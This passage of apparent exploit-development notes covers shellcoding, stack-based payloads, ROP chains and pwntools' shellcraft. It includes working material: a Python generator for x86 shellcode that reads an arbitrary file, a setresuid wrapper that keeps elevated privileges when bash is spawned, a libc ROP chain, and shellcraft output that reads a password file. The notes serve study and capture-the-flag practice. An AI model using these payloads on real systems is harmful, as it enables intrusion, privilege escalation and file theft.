Note that the usually the base pointer is trashed during the exploting
process in a normal exploitation process, but the stack pointer is not.


 - http://www.blackhatlibrary.net/Shellcode/Null-free
 - [Error codes](http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html)
 - [ARMv8 Shellcodes from ‘A’ to ‘Z’](https://arxiv.org/pdf/1608.03415.pdf)
 - https://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding

Since the standard ``/bin/sh`` is a link to ``/bin/bash`` that
droppes privileges when called, you can call instead a script
like the following

```python
#!/usr/bin/env python2
import os
os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())
os.execlp("bash", "bash")
```

In order to make the payload more abstract possible (think about environmental variables) you need
to use a shell without configuration

```
$ env -i bash --norc --noprofile
```

You can look at the system log to understand crashes, for example
the error level in syslog are defined in ``arch/*/mm/fault.c`` in kernel
source code: for example the kernel can log a line like

    kernel: myapp[15514]: segfault at 794ef0 ip 080513b sp 794ef0 error 6 in myapp[8048000+24000]

If you want to capture the segmentation fault error you can do something like [this](https://unix.stackexchange.com/questions/53289/does-segmentation-fault-message-come-under-stderr)

    { ./code; } >&log

```
/*
 * Page fault error code bits:
 *
 *   bit 0 ==    0: no page found       1: protection fault
 *   bit 1 ==    0: read access         1: write access
 *   bit 2 ==    0: kernel-mode access  1: user-mode access
 *   bit 3 ==                           1: use of reserved bit detected
 *   bit 4 ==                           1: fault was an instruction fetch
 */
```

## Stack-based

In this context you are to pratically programming with assembly
into a buffer.

For example the following shellcode opens a fixed file and then write its contents
of to a file descriptor passed as first argument into the stack:

```python
# linux/x86/read_file - 84 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
#
# Modified shell code that reads a file and write its contents in the file descriptor
# passed as first argument into the stack.
#
# TODO: make configurable the use of sys_sendto() and return to the caller.
import sys

if len(sys.argv) < 2:
    sys.stderr.write('usage: %s <PATH>' % sys.argv[0])
    sys.exit(1)

path = sys.argv[1]

def put_piece_into_stack(piece):
    length = len(piece)
    assert length <= 4

    null_byte_needed = length < 4

    if null_byte_needed:
        piece = 'x'*(4 - length) + piece

    return  null_byte_needed, ('\xb8%s' % piece) + \
            ('\xc1\xe8%c' % ((4 - length)*8) if null_byte_needed else '') + \
            '\x50'

def build_string_into_stack(path_string):
    '''Returns the instructions to put into the stack
    the path needed

    0x00000002   5               b87878786f  mov eax, 0x6f787878
    0x00000007   3                   c1e818  shr eax, 0x18
    0x0000000a   1                       50  push eax
    '''

    path_length = len(path_string)
    # split the path so that each piece fit into a 32 bits register
    path_componentes = [path_string[x:x + 4] for x in range(0, path_length, 4)]
    path_componentes.reverse()

    buf = ''

    for path_component in path_componentes:
        null_byte_needed, opcode = put_piece_into_stack(path_component)
        buf += opcode

    return buf


buf  = ""                             # NOTE: some offset are wrong since we have modified the original shellcode
buf += "\x89\xe5"                     # 0x00000000   2                     89e5  mov ebp, esp

buf += build_string_into_stack(path)

buf += "\x31\xc0"                     # 0x00000017   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000019   1                       40  inc eax
buf += "\x40"                         # 0x0000001a   1                       40  inc eax
buf += "\x40"                         # 0x0000001b   1                       40  inc eax
buf += "\x40"                         # 0x0000001c   1                       40  inc eax
buf += "\x40"                         # 0x0000001d   1                       40  inc eax
buf += "\x89\xe3"                     # 0x0000001e   2                     89e3  mov ebx, esp
buf += "\x31\xc9"                     # 0x00000020   2                     31c9  xor ecx, ecx
buf += "\xcd\x80"                     # 0x00000022   2                     cd80  int 0x80             sys_open()
buf += "\x89\xc3"                     # 0x00000024   2                     89c3  mov ebx, eax
buf += "\xb8\x40\x30\x20\x10"         # 0x00000026   5               b840302010  mov eax, 0x10203040
buf += "\xc1\xe8\x10"                 # 0x0000002b   3                   c1e810  shr eax, 0x10
buf += "\x50"                         # 0x0000002e   1                       50  push eax
buf += "\x29\xc4"                     # 0x0000002f   2                     29c4  sub esp, eax
buf += "\x31\xc0"                     # 0x00000031   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000033   1                       40  inc eax
buf += "\x40"                         # 0x00000034   1                       40  inc eax
buf += "\x40"                         # 0x00000035   1                       40  inc eax
buf += "\x89\xe7"                     # 0x00000036   2                     89e7  mov edi, esp
buf += "\x89\xf9"                     # 0x00000038   2                     89f9  mov ecx, edi
buf += "\x8b\x55\xf0"                 # 0x0000003a   3                   8b55f0  mov edx, [ebp-0x10]
buf += "\xcd\x80"                     # 0x0000003d   2                     cd80  int 0x80             sys_read()
buf += "\x89\xc2"                     # 0x0000003f   2                     89c2  mov edx, eax
buf += "\x31\xc0"                     # 0x00000041   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x00000043   1                       40  inc eax
buf += "\x40"                         # 0x00000044   1                       40  inc eax
buf += "\x40"                         # 0x00000045   1                       40  inc eax
buf += "\x40"                         # 0x00000046   1                       40  inc eax
buf += "\x8b\x5d\x04"                 # 0x00000047   3                   8b5d04  mov ebx, [ebp+0x4]
buf += "\xcd\x80"                     # 0x0000004a   2                     cd80  int 0x80             sys_write()
buf += "\x31\xc0"                     # 0x0000004c   2                     31c0  xor eax, eax
buf += "\x40"                         # 0x0000004e   1                       40  inc eax
buf += "\x31\xdb"                     # 0x0000004f   2                     31db  xor ebx, ebx
buf += "\xcd\x80"                     # 0x00000051   2                     cd80  int 0x80             sys_exit()

sys.stdout.write(buf)
```

### Retrieve buffer related address

This below is an example in which we do a jmp and a call back, in this
way we obtain from the stack the address from which the call is started:
(the code is for ``amd64``)

```asm
    /* call write(1, 4196356, 3) */
    jmp miao
start:
    pop rsi
    push (SYS_write) /* 1 */
    pop rax
    push 1
    pop rdi
    push 50
    pop rdx
    syscall
    
    ret
miao:    call start
.ascii "miao\0"
```
(is inspired from the original [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)).

## ROP

```python
import sys

from pwnlib.rop import rop
from pwnlib import constants
from pwnlib.context import context

context.arch = 'amd64'
r = rop.ROP('libc.so.6')
r.write(constants.STDOUT_FILENO, 0x400639, 5)
r.exit()

sys.stderr.write(r.dump())

sys.stdout.write(str(r))
```

 - [Some universal gadget sequence for Linux x86_64 ROP payload](https://v0ids3curity.blogspot.it/2013/07/some-gadget-sequence-for-x8664-rop.html)
 - [ROP stack pivoting](https://neilscomputerblog.blogspot.it/2012/06/stack-pivoting.html)
 - [ROPShell](http://ropshell.com/) online rop gadgets
 - [X64 Sigreturn Oriented Programming](http://blackbunny.io/x64-sigreturn-oriented-programming/)
 - [Sigreturn Oriented Programming](https://0x00sec.org/t/srop-signals-you-say/2890)
 - [Ropemporium](https://ropemporium.com) Learn return-oriented programming through a series of challenges designed to teach ROP techniques in isolation, with minimal reverse-engineering and bug-hunting.
 - [one_gadget](https://github.com/david942j/one_gadget) A tool for you easy to find the one gadget RCE in libc.so.6
 - [one-gadget RCE in Ubuntu 16.04 libc](https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/)
 - [universalrop](https://github.com/kokjo/universalrop) Small tool for generating ropchains using unicorn and z3

### Links

 - [Bypassing ASLR – Part III](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/) GOT overwrite and GOT dereference
 - [Exploiting WebKit on Vita 3.60](https://blog.xyz.is/2016/webkit-360.html)
 - [Porting exploits to a Netgear WNR2200](http://www.contextis.com/resources/blog/porting-exploits-netgear-wnr2200/)
 - [Common Pitfalls When Writing Exploits](http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html)
 - [Finding kernel symbols for shell code](https://ryiron.wordpress.com/2013/09/05/kptr_restrict-finding-kernel-symbols-for-shell-code/) methodology to find address of kernel symbols
 - [Linux Kernel pktcdvd Memory Disclosure](https://jon.oberheide.org/blog/2010/10/23/linux-kernel-pktcdvd-memory-disclosure/)
 - [Super-Stealthy Droppers](https://0x00sec.org/t/super-stealthy-droppers/3715) about injecting code in running processes without using ``ptrace`` but ``memfd_create`` and ``fexecve``

## Tools

It's possible to generate automagically shellcodes using some tools like ``shellcraft``
a command line program included with ``pwntools``:

```
$ shellcraft i386.linux.cat .passwd --format asm
    /* push '.passwd\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1657672
    push 0x7361702e
    /* call open('esp', 0, 'O_RDONLY') */
    push (SYS_open) /* 5 */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
    /* call sendfile(1, 'eax', 0, 0x7fffffff) */
    mov ecx, eax
    xor eax, eax
    mov al, 0xbb
    push 1
    pop ebx
    push 0x7fffffff
    pop esi
    cdq /* edx=0 */
    int 0x80
```

 - https://github.com/Gallopsled/pwntools-tutorial
